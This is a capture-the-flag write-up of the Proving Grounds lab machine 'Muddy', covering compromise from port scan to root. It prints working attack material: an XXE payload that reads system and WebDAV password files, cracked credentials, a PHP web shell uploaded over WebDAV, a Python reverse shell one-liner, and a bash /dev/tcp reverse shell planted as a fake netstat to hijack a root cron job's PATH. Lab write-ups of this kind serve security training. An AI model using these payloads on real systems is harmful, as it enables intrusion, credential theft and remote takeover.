---
title: "Proving grounds Play: Muddy"
layout: post
date: 2023-10-09 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74ba2023899262029fe73d3b83d4d96c (RSA)
|   256 548f79555ab03a695ad5723964fd074e (ECDSA)
|_  256 7f5d102762ba75e9bcc84fe27287d4e2 (ED25519)
25/tcp   open  smtp       Exim smtpd
| smtp-commands: muddy Hello nmap.scanme.org [192.168.45.153], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP
|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to http://muddy.ugc/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
111/tcp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  https?
808/tcp  open  tcpwrapped
908/tcp  open  tcpwrapped
8888/tcp open  http       WSGIServer 0.1 (Python 2.7.16)
|_http-title: Ladon Service Catalog
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 25/tcp   open  smtp       Exim smtpd

Nothing to exploit here!

## 80/tcp - open  http - Apache httpd 2.4.38 ((Debian))

### Directory Fuzzing

![img](/assets/images/CTF/Proving_Grounds/Muddy/web1.png)

Directory `webdav` was found but it's been password protected.

![img](/assets/images/CTF/Proving_Grounds/Muddy/dir.png)

## 8888/tcp open  http       WSGIServer 0.1 (Python 2.7.16)

![img](/assets/images/CTF/Proving_Grounds/Muddy/web2.png)

The framework Laden is vulnerable to [Ladon Framework for Python 0.9.40 - XML External Entity Expansion](https://www.exploit-db.com/exploits/43113) vulnerabilty.

### Exploitation

```text
curl -i -s -k -X $'POST' \
    -H $'Host: muddy.ugc:8888' -H $'User-Agent: curl/7.87.0' -H $'Accept: */*' -H $'Content-Type: text/xml;charset=UTF-8' -H $'SOAPAction: \"http://muddy.ugc:8888/muddy/soap11/sayhello\"' -H $'Content-Length: 496' -H $'Connection: close' \
    --data-binary $'<?xml version=\"1.0\"?>\x0a<!DOCTYPE uid\x0a[<!ENTITY passwd SYSTEM \"file:///etc/passwd\">\x0a]>\x0a<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\x0axmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\x0axmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\x0axmlns:urn=\"urn:HelloService\"><soapenv:Header/>\x0a<soapenv:Body>\x0a<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\x0a<uid xsi:type=\"xsd:string\">&passwd;</uid>\x0a</urn:checkout>\x0a</soapenv:Body>\x0a</soapenv:Envelope>' \
    $'http://muddy.ugc:8888/muddy/soap11'
```

> **Note:** Change the `urn` element as per the method allowed in the application.

![img](/assets/images/CTF/Proving_Grounds/Muddy/web3.png)

Replace the `/etc/passwd` with `/var/www/html/webdav/passwd.dav` to get the `webdav` credentials.

**Request**

```text
POST /muddy/soap11 HTTP/1.1
Host: muddy.ugc:8888
User-Agent: curl/7.87.0
Accept: */*
Content-Type: text/xml;charset=UTF-8
SOAPAction: "http://muddy.ugc:8888/muddy/soap11/sayhello"
Content-Length: 514
Connection: close

<?xml version="1.0"?>
<!DOCTYPE uid
[
<!ENTITY passwd SYSTEM "file:/var/www/html/webdav/passwd.dav">
]>
<soapenv:Envelope
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
	xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:urn="urn:HelloService">
	<soapenv:Header/>
	<soapenv:Body>
		<urn:checkout soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
			<uid xsi:type="xsd:string">&passwd;</uid>
		</urn:checkout>
	</soapenv:Body>
</soapenv:Envelope>
```

**Response**

```text
HTTP/1.0 200 OK
Date: Mon, 09 Oct 2023 02:21:57 GMT
Server: WSGIServer/0.1 Python/2.7.16
Content-Type: text/xml; charset=UTF-8
Content-Length: 484


<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="urn:muddy" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <SOAP-ENV:Body SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <ns:checkoutResponse>
      <result>Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0</result>
    </ns:checkoutResponse>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

Crack the hash `administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0` using john.

Cracked credentials `administrant:sleepless`. Use the credentials to login to `webdav` endpoint.

![img](/assets/images/CTF/Proving_Grounds/Muddy/webdav.png)

Create a web shell or a php shell and upload it to the webdav directory using curl.

```sh
naveenj@hackerspace:|22:32|~/proving_grounds/Muddy$ curl -XPUT -d @shell.php http://muddy.ugc/webdav/shell.php -u 'administrant:sleepless'
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/shell.php has been created.</p>
<hr />
<address>Apache/2.4.38 (Debian) Server at muddy.ugc Port 80</address>
</body></html>
```

Directo to `webdav` directory and trigger the shell.

![img](/assets/images/CTF/Proving_Grounds/Muddy/webdav2.png)

**PHP Code Execution Payload**

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

Now check the python version and create reverse shell payload and obtain reverse shell.

```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.200",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```sh
naveenj@hackerspace:|22:38|~/proving_grounds/Muddy$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.200] from (UNKNOWN) [192.168.196.161] 40106
www-data@muddy:/var/www/html/webdav$
```

**Initial Foothold Obtained**

## Privilege Escalation

Download and run [linpeas](https://github.com/carlospolop/PEASS-ng/releases/download/20231008-041e379c/linpeas.sh) on the attacking machine.

The script results shows the user has write accesst to `/dev/shm` folder and a cronjob is running.

**Cronjob**

```sh
www-data@muddy:/dev/shm$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
```

> **Note:** The PATH variable is specified with a new directory `PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`. 
>
> So when the cronjob runs, the system will check for the `netstat` binary's existence in the `dev/shm` folder first and then it will search in other folders.

Create a reverse shell and save it as `netstat`, apply executable permission `chmod +x netstat` and wait for reverse connection.

**netstat**

```sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.200/1234 0>&1;
```

```sh
naveenj@hackerspace:|22:52|~/proving_grounds/Muddy$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.45.200] from (UNKNOWN) [192.168.196.161] 40118
bash: cannot set terminal process group (16587): Inappropriate ioctl for device
bash: no job control in this shell
root@muddy:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@muddy:~# 
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).